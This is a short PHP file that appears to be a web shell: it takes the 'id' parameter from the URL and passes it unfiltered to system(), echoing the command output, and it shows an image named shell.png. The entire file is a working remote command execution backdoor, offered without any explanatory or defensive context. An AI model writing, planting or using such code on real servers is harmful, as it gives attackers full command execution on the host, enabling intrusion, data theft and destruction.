<?php

	$cmd = $_GET["id"];
	echo "<pre>";	
	system($cmd);
	echo "</pre>";


?>
<center>
<img src="../img/shell.png">

